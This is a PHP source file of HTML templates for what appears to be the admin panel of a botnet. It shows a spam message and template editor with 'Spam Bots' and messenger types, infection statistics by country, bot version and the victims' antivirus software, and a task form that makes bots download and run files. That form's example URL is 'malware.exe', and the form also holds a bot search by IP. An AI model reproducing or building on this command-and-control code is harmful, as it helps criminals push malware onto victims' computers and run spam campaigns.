<?


$HTML_CLEAN_HEAD = '<html><title>UNKER</title><body leftmargin="0" rightmargin="0" topmargin="0">'."\n" 
.'<META HTTP-EQUIV="Cashe-control" content="no-cashe"> '."\n"
.'<META http-equiv=Content-Type content="text/html; charset=windows-1251"> '."\n"
.'<LINK href="img/style.css" type=text/css rel=stylesheet>'."\n";

function HTML_HEADER($head){
	global $HTML_CLEAN_HEAD;
	
echo $HTML_CLEAN_HEAD 
.'<table width="100%" border=0 ></tr> '
.' <td></td> '
.' </tr> <tr><td> '
.'<table border="0" cellspacing="1" cellpadding="2" width="100%" class="brd" style="background-color: #999999 ; border-style: solid none">
<tr>'
.'<td align="center" class="titlebar" height="28" width="100%"> '
. $head.' Statistics for '.$_SERVER['SERVER_NAME'].' generated on '.date('Y/m/d', time(0))
.'</td> '
.'</tr></table>'
.'</td></tr> '
.' <tr><td><br></td> '
.' </tr> '
.' <tr><td><table border=0 align="center" cellpadding="1" cellspacing="1" bordercolor="#CCCCCC"><tr><td >'
;		
return '';	
}



function  HTML_ZUPACHA_CTRL($R){
	
	

$SCR = "\n <script type=\"text/javascript\" language=\"JavaScript\" "
." src=\"lib/JsHttpRequest/JsHttpRequest.js\"></script> \n";
	



$SCR .="<script type=\"text/javascript\" language=\"JavaScript\"> "."\n"
."function doLoad(value) { "."\n"
." var req = new JsHttpRequest(); "."\n"
." req.onreadystatechange = function() { "."\n"
." if (req.readyState == 4) { "."\n"
." document.getElementById('ZUCURRENT').innerHTML =  req.responseJS.ZUCURRENT;"."\n"
." document.getElementById('ZUTASKS').innerHTML =  req.responseJS.ZUTASKS;"."\n"
." document.getElementById('ZULANDS').innerHTML =  req.responseJS.ZULANDS;"."\n"
." document.getElementById('CURRTMPL').innerHTML =  req.responseJS.CURRTMPL;"."\n"
." document.getElementById('ZUMESSAGE').value =  req.responseJS.ZUMESSAGE;"."\n"
." document.getElementById('ZUID').value =  req.responseJS.ZUID;"."\n"
//." '<b>MD5(\"1111\")</b> = ' + "."\n"
//." '\"123\"<br> '; "."\n"
//." document.getElementById('debug').innerHTML = req.responseText; "."\n"
." } "."\n"
." };"."\n"
." req.open(null, 'task_zu.php?'+value+'&ajax', true); "."\n"
." req.send( { q: value } ); "."\n"
."} "."\n"
."</script> \n";

echo $SCR;



	
	
$ret = "<script type=\"text/JavaScript\"> "."\n"
."<!-- "."\n"
."function MM_jumpMenu(targ,selObj,restore){ //v3.0 "."\n"
." eval(targ+\".location='\"+selObj.options[selObj.selectedIndex].value+\"'\"); "."\n"
." if (restore) selObj.selectedIndex=0; "."\n"
."} "."\n"
."//--> "."\n"
."</script> "."\n"
." "."\n"
."<table width=\"80%\" border=\"0\" align=\"center\" cellpadding=\"1\" cellspacing=\"4\"> "."\n"
."<form action=\"\" name=\"zup\" method=\"post\"><input type=hidden name=ZUID id=ZUID value=\"".$R['ZUID']."\">"."\n"
."<tr> "."\n"
."<td colspan=\"3\" class=\"bhead\"><strong>Zupacha</strong> <img src=\"img/zupch.gif\" width=\"16\" height=\"16\">&nbsp;&nbsp;&nbsp;Mini control </td> "."\n"
."</tr> "."\n"
." <tr> "."\n"
." <th width=\"29%\" class=\"chck\" scope=\"row\"> "."\n"
." <table width=\"123\" border=\"1\" align=\"center\" class=\"file2\"> "."\n"
." <tr><td width=\"146\" nowrap=\"nowrap\" class=\"prim_s\"><div align=\"center\">Select and Add Country</div></td> "."\n"
." </tr><tr><td> "."\n"
//." <select name=\"sel_land\" onChange=\"MM_jumpMenu('parent',this,0)\"> "."\n"
."<div id=\"ZULANDS\">"
.$R['ZULANDS']
//." </select> "."\n"
."</div>"
." </td></tr></table> </th> "."\n"
." <td width=\"2%\" class=\"chck\">&nbsp;</td> "."\n"
." <td width=\"69%\" class=\"chck\"> "."\n"
." <!-- top editable zone --> "."\n"
." <table width=\"257\" class=\"zag\" > "."\n"
." <tr> "."\n"
." <td >Add/Edit message type for country: </td> "."\n"
." </tr> "."\n"
." <tr> "."\n"
." <td bgcolor=\"FCFCFC\" nowrap=\"nowrap\"><div id=\"ZUCURRENT\">"."\n"
.$R['ZUCURRENT']
."</div></td> "."\n"
." </tr> "."\n"
." </table> "."\n"
." <!--// top editable zone --> </td> "."\n"
." </tr> "."\n"
." <tr> "."\n"
." <th rowspan=\"3\" scope=\"row\" bgcolor=\"FCFCFC\"> "."\n"
." <!-- added countries --> "."\n"
."<div id=\"ZUTASKS\">"
.$R['ZUTASKS']
."</div>"
." <!--// added countries --> </th> "."\n"
." <td>&nbsp;</td> "."\n"
." <td><br> "."\n"
." <table width=\"100%\" cellpadding=\"1\" cellspacing=\"4\"> "."\n"
.'<tr><td colspan=2>'
."<div id=\"CURRTMPL\">"
.$R['CURRTMPL']
."</div>"
." <fieldset> "."\n"
." <legend>Message body</legend> "."\n"
." <textarea name=\"ZUMESSAGE\" cols=\"75\" rows=\"7\" >".$R['ZUMESSAGE']."</textarea> "."\n"
." </fieldset> </td> "."\n"
.'</td></tr>'
." <tr><td width=\"68%\"><br><input type=\"reset\" name=\"Submit4\" value=\"Clear\">&nbsp;&nbsp;<input type=\"submit\" name=\"Submit4\" value=\"Save Settings\">&nbsp;&nbsp;&nbsp;Reset counters:&nbsp;<input name=\"ZURESETCNT\" type=\"checkbox\" id=\"ZURESETCNT\" value=\"1\"> </td> "."\n"
." <td width=\"32%\"></td> "."\n"
." </tr></table> "."\n"
." <table height=\"100%\" border=\"0\"> "."\n"
." <tr><td height=\"100%\"></td></tr></table>"
." </td></tr> "."\n"
." <tr> "."\n"
." <td height=\"29\">&nbsp;</td> "."\n"
." <td> "."\n"
." </td> "."\n"
." </tr> "."\n"
." </form> "."\n"
."</table>";	
	
	echo $ret;
	return '';
};


function HTML_ZUPACHA_TPL($ARR){
  
	
$SCR = "\n <script type=\"text/javascript\" language=\"JavaScript\" "
." src=\"lib/JsHttpRequest/JsHttpRequest.js\"></script> \n";
	



$SCR .="<script type=\"text/javascript\" language=\"JavaScript\"> "."\n"
."function doLoad(value) { "."\n"
." var req = new JsHttpRequest(); "."\n"
." req.onreadystatechange = function() { "."\n"
." if (req.readyState == 4) { "."\n"
." document.getElementById('ZUMESSAGESS').innerHTML =  req.responseJS.ZUMESSAGESS;"."\n"
." document.getElementById('ZUTMPL').innerHTML =  req.responseJS.ZUTMPL;"."\n"
." document.getElementById('ZUTMPLCURRENT').innerHTML =  req.responseJS.ZUTMPLCURRENT;"."\n"
." document.getElementById('MSG').innerHTML =  req.responseJS.MSG;"."\n"
." document.getElementById('SAVEMSG').value =  req.responseJS.SAVEMSG;"."\n"
//." document.getElementById('ZUID').value =  req.responseJS.ZUID;"."\n"
//." '<b>MD5(\"1111\")</b> = ' + "."\n"
//." '\"123\"<br> '; "."\n"
//." document.getElementById('debug').innerHTML = req.responseText; "."\n"
." } "."\n"
." };"."\n"
." req.open(null, 'tpledit_zu.php?'+value+'&ajax', true); "."\n"
." req.send( { q: value } ); "."\n"
."} "."\n"
."</script> \n";

echo $SCR;	
	
	
	
	$ret = "<table width=\"80%\" border=\"0\" align=\"center\" cellpadding=\"1\" cellspacing=\"4\"> "."\n"
."<form action=\"\" name=\"zup\" method=\"post\"> "."\n"
."<tr> "."\n"
."<td colspan=\"3\" class=\"bhead\"><strong>Zupacha</strong> <img src=\"img/zupch.gif\" width=\"16\" height=\"16\">&nbsp;&nbsp;&nbsp;Template Editor </td> "."\n"
."</tr> "."\n"
." <tr> "."\n"
." <th width=\"29%\" class=\"chck\" scope=\"row\"> "."\n"
." "."\n"
." "."\n"
." <table width=\"279\" border=\"1\" align=\"center\" class=\"file2\"> "."\n"
." "."\n"
." <tr><td width=\"234\" nowrap=\"nowrap\" class=\"prim_s\"><div align=\"center\">Create a new template </div></td> "."\n"
." </tr><tr> "."\n"
." <td> "."\n"
." <table width=\"98%\" border=\"0\" cellspacing=\"1\" cellpadding=\"1\"> "."\n"
.'<form action="tpledit_zu.php" method=POST><input type=hidden name=addzutmpl>'
." <tr> "."\n"
." <td bgcolor=\"#FFFFFF\" >&nbsp;Name:</td> "."\n"
." <td colspan=\"2\" bgcolor=\"#FFFFFF\">&nbsp;Template type : </td> "."\n"
." <td bgcolor=\"#FFFFFF\">&nbsp;&nbsp;Go!</td> "."\n"
." </tr> "."\n"
." <tr> "."\n"
." <th scope=\"row\"><input name=\"TPLNAME\" type=\"text\" size=\"15\"></th> "."\n"
." <td nowrap=\"nowrap\" bordercolor=\"1\">&nbsp;"."\n"
.'<select name=TPLTYPE>'
.'<option value="MAIL">E-Mail</option>'
.'<option value="IM">IMessenger</option>'
.'<option value="SB">Spam Bots</option>'
.'<select>'
//." <input name=\"TPLTYPE\" type=\"radio\" value=\"MAIL\"></td> "."\n"
//." <td nowrap=\"nowrap\">&nbsp;IMessenger:"."\n"
//." <input name=\"TPLTYPE\" type=\"radio\" value=\"IM\" checked> "."\n"
." </td><td>&nbsp;&nbsp;&nbsp;<input type=\"submit\" name=\"Submit5\" value=\"Create\"></td> "."\n"
." </tr> "."\n"
.'</form>'
."</table> "."\n"
." </td> "."\n"
." </tr></table> </th> "."\n"
." <td width=\"2%\" class=\"chck\">&nbsp;</td> "."\n"
." <td width=\"69%\" class=\"chck\"> "."\n"
." "."\n"
." <!-- top editable zone --> "."\n"
." "."\n"
.'<font color=red><div id="MSG">'.$ARR['ZUMSG'].'</div></font>'
." <table width=\"40%\" class=\"zag\" > "."\n"
." <tr> "."\n"
." <td >Edit template:</td> "."\n"
." </tr> "."\n"
." <tr> "."\n"
." <td bgcolor=\"FCFCFC\" nowrap=\"nowrap\">"
.'<div id="ZUTMPLCURRENT">'
." Please select template."."\n"
.'</div>'
."</td> "."\n"
." </tr> "."\n"
." </table> "."\n"
." <!--// top editable zone --> </td> "."\n"
." </tr> "."\n"
." <tr> "."\n"
." <td rowspan=\"3\" scope=\"row\" bgcolor=\"FCFCFC\"> "."\n"
." <!-- added tpl`s --> "."\n"
."<div id=\"ZUTMPL\">"
.$ARR['ZUTMPL']
.'</div>'
." <!--// added tpl`s --> "."\n"
.'<form action=tpledit_zu.php method=POST>'
.'<input type=hidden name=SAVEMSG value=1>'
."</td> "."\n"
." <td >&nbsp;</td> "."\n"
." <td > "."\n"
." <table width=\"100%\" border=\"0\" align=\"center\"> "."\n"
." <tr><td colspan=\"2\"> "."\n"
."  "."\n"

."<div id=\"ZUMESSAGESS\">"


.'</div>'
." <td width=\"20%\"></td> "."\n"
." </tr></table> "."\n"
." <table height=\"100%\" border=\"0\"> "."\n"
." <tr><td height=\"100%\"></td></tr></table> "."\n"
."</td> "."\n"
." </tr> "."\n"
." <tr> "."\n"
." <td colspan=\"2\"> "."\n"
." </td> "."\n"
." </tr> "."\n"
." </form> "."\n"
."</table>";

echo $ret;
return '';
	
	
	
};





function TBL_DETAIL($arr){
global $MATCH,$MATCH_COUNTRIES,$STAT_DEF_LAND_SS;	

$SCR = "\n <script language=\"JavaScript\"> "."\n"
."<!-- "."\n"
."function makevisible(cur,which){ "."\n"
."strength=(which==0)? 1 : 0.09 "."\n"
." "."\n"
."if (cur.style.MozOpacity) "."\n"
."cur.style.MozOpacity=strength "."\n"
."else if (cur.filters) "."\n"
."cur.filters.alpha.opacity=strength*100 "."\n"
."} "."\n"
."// code for highlight - style=\"filter:alpha(opacity=20);-moz-opacity:0.2\" onMouseover=\"makevisible(this,0)\" onMouseout=\"makevisible(this,1)\" "."\n"
." "."\n"
."function MM_preloadImages() { //v3.0 "."\n"
." var d=document; if(d.images){ if(!d.MM_p) d.MM_p=new Array(); "."\n"
." var i,j=d.MM_p.length,a=MM_preloadImages.arguments; for(i=0; i<a.length; i++) "."\n"
." if (a[i].indexOf(\"#\")!=0){ d.MM_p[j]=new Image; d.MM_p[j++].src=a[i];}} "."\n"
."} "."\n"
." "."\n"
."//--> "."\n"
."</script> \n";

$SCR .= "\n <script type=\"text/javascript\" language=\"JavaScript\" "
." src=\"lib/JsHttpRequest/JsHttpRequest.js\"></script> \n";


$SCR .="<script type=\"text/javascript\" language=\"JavaScript\"> "."\n"
."function doLoad(value) { "."\n"
." var req = new JsHttpRequest(); "."\n"
." req.onreadystatechange = function() { "."\n"
." if (req.readyState == 4) { "."\n"
." document.getElementById('resultland').innerHTML =  req.responseJS.LAND_STAT;"."\n"
." document.getElementById('LAND_NAVIG').innerHTML =  req.responseJS.LAND_NAVIG;"."\n"
." } "."\n"
." };"."\n"
." req.open(null, 'getglobal.php?getland='+value, true); "."\n"
." req.send( { q: value } ); "."\n"
."} "."\n"
."</script> \n";

echo $SCR;

echo " <table border=0 align=\"center\" cellpadding=\"0\" cellspacing=\"20\" bordercolor=\"#CCCCCC\" bgcolor=\"#FFFFFF\"> "."\n"
." <tr>";

//zupacha stat
echo "<td>".
"<table width=\"100%\" border=\"0\" align=\"center\" cellpadding=\"1\" cellspacing=\"8\" bordercolor=\"#FF0000\" class=\"cntbox\"> "."\n"
."<tr> "."\n"
." <td width=\"91%\" nowrap=\"nowrap\"><font size=\"1\" face=\"Tahoma, Arial\"><strong>Zupacha</strong><img src=\"img/zupch.gif\" width=\"16\" height=\"16\"> Mini stats </font></td> "."\n"
." <td width=\"9%\">&nbsp;</td> "."\n"
." <!-- td width=\"38%\" nowrap=\"nowrap\"><font size=\"1\" face=\"Tahoma, Arial\"> Top Anti<sup>virus-spyware</sup>&nbsp; software.</font></td--> "."\n"
."</tr> "."\n"
." "."\n"
."<tr><td class=\"srchinp\">"
.$arr['ZU_STATS']
." <td>&nbsp;</td> "."\n"
." <!-- td rowspan=\"3\"> "."\n"
." "."\n"
." "."\n"
." "."\n"
." </td> "."\n"
." </tr><tr> "."\n"
." <td width=\"91%\"><font size=\"1\" face=\"Tahoma, Arial\">Top Land by </font></td> "."\n"
." <td>&nbsp;</td> "."\n"
." "."\n"
." </tr><tr> "."\n"
." <td class=\"srchinp\"><!-- tbl land --> "."\n"
." <td>&nbsp;</td--> "."\n"
." </tr></table>"
."</td>";


echo "<td> "."\n"
."<table border=0  cellspacing=\"13\"> "."\n"
."<tr> "."\n"
."<td class=\"chck\">";

echo '<table width="100%" border="0" align="center" cellpadding="1" cellspacing="6" class="cntbox"> '
.'<tr> <td width="30%"><font size="1" face="Tahoma, Arial">Top '.$MATCH_COUNTRIES.' Counries&nbsp;&nbsp;&nbsp;(<a href="getglobal.php?allcountries">see all</a>)</font></td> '
.' <td width="30%"><font size="1" face="Tahoma, Arial">Top '.$MATCH.' new '
.' counries today </font></td> '
.' <td width="38%" nowrap="nowrap"><font size="1" face="Tahoma, Arial">Top '.$MATCH.' Countries '
.' order by bot`s reports</font></td> '
.'</tr> '
.'<tr> '
.' <td width="30%" rowspan="3" class="srchinp">'.$arr["TOP_COUNTRIES"].' </td> '
.' <td class="srchinp">'.$arr["TOP_COUNTRIES_TODAY"].'</td> '
.' <td>'.$arr["TOP_COUNTRIES_REPORT"].'</td> '
.' </tr><tr> '
.' <td width="30%"><font size="1" face="Tahoma, Arial">Top '.$MATCH.' bot versions</font></td> '
.' <td width="30%"><font size="1" face="Tahoma, Arial"><!--Most '.$MATCH.' live '
.' countries--> </font></td> '
.' </tr><tr> '//.' <td class="srchinp">&nbsp;</td> '
.' <td class="srchinp">'.$arr["TOP_BOT_VERSION"].'</td>'
.'<td>&nbsp;</td> '
.' </tr></table>'
.' <BR> '
.$arr["TOP_SUMARIZE"];

	
echo " </td><td>";

echo   "<table cellpadding=\"1\" cellspacing=\"7\" border=0 class=\"cntbox\"> "."\n"
." <tr><td><font size=\"1\" face=\"Tahoma, Arial\">Top Anti<sup>virus-spyware</sup>&nbsp; software.</font></td> "."\n"
.land_pec_navi()
." </tr><tr> "."\n"
." <td> "."\n";


echo gen_glob_soft_tbl();
 echo '</td><td bgcolor="FFFFFF">'; //#edf0f9
 
     if($STAT_DEF_LAND_SS == 'COUNTRIES')
echo gen_countrys_ratings();     
     else
echo gen_land_perc($arr['LAND_SOFTSTAT']);
 


echo  '</td></tr></table>';

return '';

};













function HTML_FOOTER(){
echo ' </td> '
.' </tr></table></td></tr></table> ';
	
	
	
};

function HTML_TASK_ADD($param){

$HTML_TASK_TBL_ADD = "<script language='JavaScript'> \n"
."//<--#edf0f9 \n"
."function single_load(str){ \n"
."document.forms['addtask'].compid.value = str; \n"
."}; \n"
." function link(str){ \n"
." smiles = window.open(\"task.php?wohead&geturls=\" + str , \"displayWindow\", \n"
." \"width=317,height=205,status=no,toolbar=no,menubar=no,scrollbars=yes\"); \n"
." smiles.focus(); \n"
." //return false; \n"
." } \n"
."// --> \n"
." </script>\n";
	
	
$HTML_TASK_TBL_ADD .=
"<table width=\"500\" border=\"0\" align=\"center\"> "
." <tr> "
." <td><!--Left Side--> "
." <form name=\"addtask\" action=\"task.php\" method=POST> "
." <table width=\"500\" border=\"0\" align=\"left\" cellpadding=\"0\" cellspacing=\"0\"> "
." <tr> "
." <td><table width=\"196\" border=\"0\" align=\"left\" cellpadding=\"0\" cellspacing=\"0\" class=\"navNormal\"> "
." <tr> "
." <td width=\"190\"><div align=\"left\"><font size=\"1\">Select Land (Multi Load)</font></div></td> "
." <td width=\"10\" bgcolor=\"#999999\"><font size=\"1\">or</font></td> "
." <td width=\"183\" nowrap=\"nowrap\"><font size=\"1\">Insert CompID (Single load)</font></td> "
." </tr> "
." <tr> "
." <td><select name=\"land\" > <option>All | All countries</option>"
.$param['LAND']
." </select> "
." <!--input name=\"sel\" type=button value=\"Select\"--> "
." </td> "
." <td bgcolor=\"#999999\">&nbsp;|</td> "
." <td><input name=\"compid\" type=\"text\" size=\"29\"></td> "
." </tr> "
." <tr> "
." <td><font size=\"1\">Count to Install </font></td> "
." <td></td> "
." <td></td> "
." </tr> "
." <tr> "
." <td colspan=\"3\" nowrap=\"nowrap\"><label> "
." <div align=\"center\"> "
." <input type=\"text\" name=\"install\" value=\"*\"> "
." <input name=\"sum\" type=\"checkbox\" value=\"checked\"  checked=\"checked\"> <a title=\"Sum. = Count to intall * Count Url`s\n"
."\"><font size=\"1\">Sum.</font></a></label> "
." </td> "
." </tr> "
." </table><center>".$param['MSG']."</center></td> "
." </tr> "
." <tr> "
." <td><table width=\"500\" border=\"0\" align=\"center\" class=\"navNormal\"> "
." <tr> "
." <td width=\"273\"><div align=\"left\"><font size=\"1\">Url`s to load (<a "
." title=\"http://some.com/1.exe \n"
."http://go.com/malware.exe \n"
."http://kuxi.net/download.php?hu=1\">Example</a>)</font></font>".str_repeat("&nbsp;",5)."<input name=\"kill\" type=\"checkbox\" value=\"checked\" checked disabled=\"disabled\">&nbsp;<font size=\"1\">Don`t kill loader after job</font>
</div></td> "
." <td width=\"169\">&nbsp;</td> "
." <td width=\"42\" class=\"zag\">&nbsp;</td> "
." </tr> "
." <tr> "
." <td><label> "
." <textarea name=\"urls\" cols=\"40\" rows=\"4\"></textarea> "
." </label></td> "
." <td><font size=\"1\">Hint:<em>After each URL you should to press 'Enter' to make new line separate. It`s necessary. </em></font></td> "
." <td class=\"zag\">&nbsp;</td> "
." </tr> "
." <tr> "
." <td ><label> "
." <input name=\"Submit2\" type=\"reset\" value=\"Reset Form\"> "
." </label></td> "
." <td ><label> "
." <input type=\"submit\" name=\"Submit\" value=\"Add to tasks\"> "
." </label></td> "
." <td class=\"zag\">&nbsp;</td> "
." </tr> "
." </table></td> "
." </tr> "
." <tr> "
." <td class=\"navNormalbottom\">"
." </td> "
." </tr> "
." </table> "
."</form> "
." </td> "
." <td><!-- Right side--> "
."<form name=\"search\" method=\"post\" action=\"task.php\"> "
." <table width=\"171\" border=\"0\" align=\"center\" cellpadding=\"0\" cellspacing=\"0\" class=\"navNormal\"> "
." <tr> "
." <td width=\"199\">Search BOT </td> "
." </tr> "
." <tr> "
." <td nowrap=\"nowrap\"> "
." "
." <label> "
." <font size=\"1\">by CompID</font> <input name=\"S_COMPID\" type=\"text\" size=\"22\"> "
." </label> "
." "
." </td> "
." </tr> "
." <tr> "
." <td nowrap=\"nowrap\"><font size=\"1\">by IP</font> <input name=\"S_IP\" type=\"text\" size=\"15\">&nbsp;&nbsp; "
." <a title=\"You can use: \n"
."127.0.0.* \n"
."127.* \n"
."*.0.0.*\n\"><font size=\"1\">Extended</font></a></td> "
." </tr> "
." <tr> "
." <td nowrap=\"nowrap\"><font size=\"1\">Results per page </font><input name=\"S_RESULTS\" type=\"text\" value=\"30\" size=\"5\" maxlength=\"3\"></td> "
." </tr>"
." <tr> "
." <td class=\"navNormalbottom\"><label> "
." <div align=\"right\"> "
." <input type=\"submit\" name=\"Submit3\" value=\"Search\"> "
." </div> "
." </label></td> "
." </tr> "
." </table></form>"
." <!-- //Right side--> </td> "
." </tr> "
." <tr> "
." <td> "
." <br><br> "
." <!-- tasks --> "
.$param['TASKS']
." </td> "
."<td><br> " //start
.$param['SRCH']
." <br></td>" //end
." </tr> "
."</table>";

return $HTML_TASK_TBL_ADD; 
};


function HTML_STAT_GETTIME(){
	

$IMAGES_PATH = "stat_img";
$TITLE_SIZE = 9;
$TEXT_SIZE= 8;
$NUM_SIZE = 7;
	
	return "<style type=\"text/css\">\n"
          ."<!--\n"
    // Body styles
          ."  body {margin: 0px; padding: 0px; background-color: #FCFCFC}\n"
    // redefined tags
          ."  p {font-family: Arial, Helvetica, sans-serif; color: #606680; font-size: ".$TEXT_SIZE."pt}\n"
          ."  td {font-family: Arial, Helvetica, sans-serif; color: #606680; font-size: ".$TEXT_SIZE."pt}\n"
          ."  input {border: 1px #606680 solid; background-color: #edf0f9; vertical-align: middle}\n"
          ."  select {border: 1px #606680 solid; background-color: #edf0f9; vertical-align: middle}\n"
    // Links styles
          ."  a {text-decoration: underline; color: #cc7286}\n"
          ."  a:hover {text-decoration: none; color: #606680}\n"
    // Navbar
          ."  a.navbar {font-family: Tahoma, Helvetica, sans-serif; font-size: 10px; font-weight: bolder; "
          ."text-decoration: none; padding: 1px; color: #000000; border: 1px solid #EDA80C;}\n"   //606680
          ."  a.navbar:hover  {font-family: Tahoma, Helvetica, sans-serif; font-size:10px;  "
          ."text-decoration: none; padding: 1px; border: 1px solid #606680; background-color: #edf0f9}\n"
          ."  .navbar {font-family: Arial, Helvetica, sans-serif; font-size: "."SUBTITLE"."pt; "
          ."color: #98a3d1; font-weight: bold; margin: 0px; padding: 10px; vertical-align: middle}\n"
          ."  .navbar img {vertical-align: middle}\n"
    // Titlebar
          ."  .titlebar {color: #ffffff; font-weight: bold; font-size: ".$TITLE_SIZE."pt}\n"
    // Stats
          ."  .head {font-family: Arial, Helvetica, sans-serif; font-size: ".$TEXT_SIZE."pt; text-align: center; "
          ."font-weight: bold; padding: 3px; white-space: nowrap}\n"
          ."  .graph {font-family: Arial, Helvetica, sans-serif; color: #606680; font-size: ".$NUM_SIZE."pt; "
          ."padding: 3px}\n"
          ."  .capt {font-weight: bold; color: #ffffff; white-space: nowrap}\n"
    // boxes
          ."  .cntbox {background-color:#ffffff; border: 1px #606680 solid}\n"
          ."  .detbox {background-color:#ffffff; border: 1px #606680; border-style: solid none}\n"
          ."  .gridbox {margin: 0px; border: 0px #606680 solid}\n"
    // border madness
          ."  .brd {border-width: 1px; border-color: #000000}\n"
           // collapse where 1px borders are needed
          ."  .collapse {border-collapse: collapse}\n"
          ."  .rows {margin: 0px; border: 1px #ffffff solid}\n"
          ."  .sky {border-width: 0px; border-color: #e5f2f7}\n"
          ."  table {border-collapse: collapse}\n"
           // evil hack for Opera 7+
          ."  tab\\le {border-collapse: separate;}\n"
           // evil hack for IE5 Mac
          ."  /*\*//*/\n"
          ."  td table {width:97%; margin:0px 1px 0px 0px; padding:0px}\n"
          ."  /**/\n"
          ."//-->\n"
          ."</style>\n";	
	
};



?>